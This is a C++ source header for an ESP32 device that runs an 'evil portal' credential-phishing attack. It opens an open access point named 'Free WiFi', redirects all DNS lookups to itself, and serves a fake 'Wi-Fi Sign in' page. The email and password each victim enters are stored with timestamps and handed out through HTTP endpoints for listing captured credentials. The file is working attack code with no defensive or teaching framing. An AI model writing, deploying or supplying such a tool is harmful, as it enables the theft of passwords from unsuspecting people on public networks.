#pragma once
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "module.h"
static bool ep_running = false, ep_routes_done = false;
static DNSServer ep_dns;
static String ep_ssid = "Free WiFi", ep_creds;
static const char EP_PAGE[] PROGMEM =
    R"HTML(<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in</title>
<style>body{font-family:system-ui;max-width:360px;margin:60px auto;padding:16px;color:#222}h2{color:#0a6e8a}
input{display:block;width:100%;box-sizing:border-box;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:6px;font-size:16px}
button{width:100%;padding:12px;background:#0a6e8a;color:#fff;border:0;border-radius:6px;font-size:16px}</style></head><body>
<h2>Wi-Fi Sign in</h2><form method="post" action="/portal/login">
<input name="u" placeholder="Email" required><input name="p" placeholder="Password" type="password" required>
<button>Continue</button></form></body></html>)HTML";
static void ep_handle_root() {
  extern WebServer server;
  server.send_P(200, "text/html", EP_PAGE);
}
static void ep_handle_login() {
  extern WebServer server;
  String u = server.arg("u"), p = server.arg("p");
  ep_creds += u + ":" + p + "@" + String(millis() / 1000) + "\n";
  server.send(200, "text/html", "<h2>Connected</h2>");
}
static bool ep_start(const String &q) {
  int i;
  if ((i = q.indexOf("ssid=")) >= 0) {
    int e = q.indexOf('&', i);
    ep_ssid = q.substring(i + 5, e < 0 ? q.length() : e);
  }
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ep_ssid.c_str());
  ep_dns.start(53, "*", WiFi.softAPIP());
  if (!ep_routes_done) {
    extern WebServer server;
    server.on("/portal", HTTP_GET, ep_handle_root);
    server.on("/portal/login", HTTP_POST, ep_handle_login);
    ep_routes_done = true;
  }
  ep_running = true;
  return true;
}
static void ep_stop() {
  ep_dns.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("ESP32-DOOM", "doomdoom");
  ep_running = false;
}
static void ep_loop() {
  if (ep_running)
    ep_dns.processNextRequest();
}
static void ep_routes() {
  extern WebServer server;
  server.on("/api/portal/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("portal", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/portal/stop", HTTP_POST, []() {
    tool_stop("portal");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/portal/status", HTTP_GET, []() {
    server.send(200, "application/json",
                "{\"running\":" + String(ep_running ? 1 : 0) + ",\"msg\":\"" +
                    String(ep_creds.length()) + " captured\"}");
  });
  server.on("/api/portal/creds", HTTP_GET, []() {
    String j = "{\"lines\":\"";
    j += ep_creds;
    j.replace("\n", "\\n");
    j += "\"}";
    server.send(200, "application/json", j);
  });
}
